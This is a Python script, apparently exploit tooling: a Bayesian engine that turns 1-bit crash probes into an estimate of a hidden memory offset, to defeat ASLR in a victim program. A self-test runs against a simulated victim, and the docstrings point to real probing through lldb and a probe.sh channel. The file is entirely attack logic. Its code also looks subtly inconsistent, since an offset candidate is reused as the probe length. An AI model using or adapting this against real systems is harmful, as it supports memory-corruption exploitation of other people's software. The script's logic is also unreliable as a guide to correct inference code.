#!/usr/bin/env python3
"""ASLR crash-oracle inference engine — consumes 1-bit probes, maintains posterior
over (in-zone offset of x27 = d27), predicts boundary Ls. Ground truth via lldb
pre-pass in validate.py. Class-C leak: crash when walk's semi-real pointer lands
BELOW region base; boundary sweep of L maps d27."""
import json, os, sys

class OracleEngine:
    def __init__(self, prior_lo=0x20000, prior_hi=0x180000):
        # d27 candidates: x27's distance above region base (observed CI: 74K-311K+)
        self.cands = list(range(prior_lo, prior_hi, 4096))
        self.posterior = {c: 1.0/len(self.cands) for c in self.cands}
        self.history = []

    def probe_model(self, L, d27_true, pool_delta):
        """Simulated victim: crash iff semi-real pointer (d27 - pool_delta - f(L)-low)
        lands below region base. Stand-in for the real 1-bit channel; replaced by
        probe.sh output in validation mode."""
        fa_off = pool_delta + (L * 64 % 0x13000)   # empirical low-bits shape
        return 1 if fa_off > d27_true else 0

    def update(self, L, bit, pool_delta):
        self.history.append((L, bit))
        for c in self.posterior:
            pred = 1 if (pool_delta + (L * 64 % 0x13000)) > c else 0
            self.posterior[c] *= (0.9 if pred == bit else 0.1)
        s = sum(self.posterior.values()) or 1
        self.posterior = {c: v/s for c, v in self.posterior.items()}

    def best(self):
        return max(self.posterior.items(), key=lambda kv: kv[1])

    def next_probe(self):
        """Highest-entropy boundary: d27 candidate where posterior splits best."""
        weighted = sorted(self.posterior.items(), key=lambda kv: -kv[1])
        return weighted[len(weighted)//2][0]

if __name__ == "__main__":
    e = OracleEngine()
    # self-test with synthetic truth
    truth = 0x48000
    for _ in range(24):
        L = e.next_probe()
        bit = e.probe_model(L, truth, 0x46000)
        e.update(L, bit, 0x46000)
    est, conf = e.best()
    print(json.dumps({"truth": hex(truth), "estimated": hex(est),
                      "confidence": round(conf, 3), "probes": len(e.history)}))
